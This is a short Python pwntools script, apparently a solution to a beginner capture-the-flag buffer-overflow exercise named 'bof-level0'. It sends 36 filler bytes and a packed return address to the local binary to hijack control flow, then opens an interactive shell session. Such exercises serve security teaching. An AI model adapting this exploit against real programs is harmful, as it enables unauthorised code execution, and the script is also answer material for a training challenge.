#!/usr/bin/env python

from pwn import *

p = process("./bof-level0")

print(p.recv())

p.sendline("A"*36 + p32(0x8048500))

p.interactive()
